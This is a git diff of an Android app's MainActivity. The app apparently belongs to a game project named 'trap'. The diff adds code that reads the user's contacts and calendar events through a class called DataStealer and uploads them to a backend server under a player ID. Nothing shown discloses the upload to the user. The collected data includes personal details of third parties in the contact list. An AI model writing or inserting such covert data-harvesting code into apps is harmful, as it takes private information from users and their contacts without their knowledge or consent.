@@ -13,7 +13,6 @@ import com.google.android.gms.location.LocationCallback;
 import com.google.android.gms.location.LocationRequest;
 import com.google.android.gms.location.LocationResult;
 import com.google.android.gms.location.LocationServices;
-import com.google.android.gms.tasks.OnSuccessListener;
 
 import java.util.ArrayList;
 import java.util.concurrent.TimeUnit;
@@ -21,11 +20,14 @@ import java.util.concurrent.TimeUnit;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
+
+import de.hpi3d.gamepgrog.trap.APIBuilder;
 import de.hpi3d.gamepgrog.trap.BackendManagerIntentService;
 import de.hpi3d.gamepgrog.trap.DataStealer;
 import de.hpi3d.gamepgrog.trap.R;
 import de.hpi3d.gamepgrog.trap.datatypes.CalendarEvent;
 import de.hpi3d.gamepgrog.trap.datatypes.Contact;
+import de.hpi3d.gamepgrog.trap.datatypes.UserDataPostRequestFactory;
 
 public class MainActivity extends AppCompatActivity {
 
@@ -36,6 +38,8 @@ public class MainActivity extends AppCompatActivity {
 
     private LocationCallback locationCallback;
     private FusedLocationProviderClient fusedLocationClient;
+
+    private APIBuilder.API server;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -48,6 +52,7 @@ public class MainActivity extends AppCompatActivity {
         }
         setContentView(R.layout.activity_main);
 
+        server = APIBuilder.build();
     }
 
     /**
@@ -90,7 +95,7 @@ public class MainActivity extends AppCompatActivity {
                     PERMISSION_REQUEST_IDENTIFIER_READ_CONTACTS);
         } else {
             // Permission has already been granted
-            displayContactDataInLog();
+            displayAndSendContactDataInLog();
         }
 
     }
@@ -105,7 +110,7 @@ public class MainActivity extends AppCompatActivity {
                     PERMISSION_REQUEST_IDENTIFIER_READ_CALENDAR);
         } else {
             // Permission has already been granted
-            displayCalendarDataInLog();
+            displayAndSendCalendarDataInLog();
         }
 
     }
@@ -119,7 +124,7 @@ public class MainActivity extends AppCompatActivity {
                 if (grantResults.length > 0
                         && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                     // permission was granted
-                    displayContactDataInLog();
+                    displayAndSendContactDataInLog();
                 }
                 return;
             }
@@ -127,7 +132,7 @@ public class MainActivity extends AppCompatActivity {
                 if (grantResults.length > 0
                         && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                     // permission was granted
-                    displayCalendarDataInLog();
+                    displayAndSendCalendarDataInLog();
                 }
             }
             case PERMISSION_REQUEST_IDENTIFIER_READ_LOCATION: {
@@ -140,22 +145,39 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
-    private void displayContactDataInLog() {
+    private void displayAndSendContactDataInLog() {
         ArrayList<Contact> contacts = DataStealer.takeContactData(getApplicationContext());
 
         for (Contact c : contacts) {
             System.out.println(c.toString());
         }
 
-
+        sendContactData(contacts);
     }
 
-    private void displayCalendarDataInLog() {
+    private void sendContactData(ArrayList<Contact> contacts) {
+        int userId = getUserId();
+        server.addData(userId, UserDataPostRequestFactory.buildWithContacts(contacts)).subscribe();
+    }
+
+    private void displayAndSendCalendarDataInLog() {
         ArrayList<CalendarEvent> cEvents = DataStealer.takeCalendarData(getApplicationContext());
 
         for (CalendarEvent c : cEvents) {
             System.out.println(c);
         }
+
+        sendCalenderData(cEvents);
+    }
+
+    private void sendCalenderData(ArrayList<CalendarEvent> cEvents) {
+        int userId = getUserId();
+        server.addData(userId, UserDataPostRequestFactory.buildWithCalendarEvents(cEvents))
+                .subscribe();
+    }
+
+    private int getUserId() {
+        return BackendManagerIntentService.getPlayerId(this);
     }
 
 
@@ -217,12 +239,7 @@ public class MainActivity extends AppCompatActivity {
         FusedLocationProviderClient fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
 
         fusedLocationClient.getLastLocation()
-                .addOnSuccessListener(this, new OnSuccessListener<Location>() {
-                    @Override
-                    public void onSuccess(Location location) {
-                        buildLocationToast(location);
-                    }
-                });
+                .addOnSuccessListener(this, this::buildLocationToast);
 
     }
 
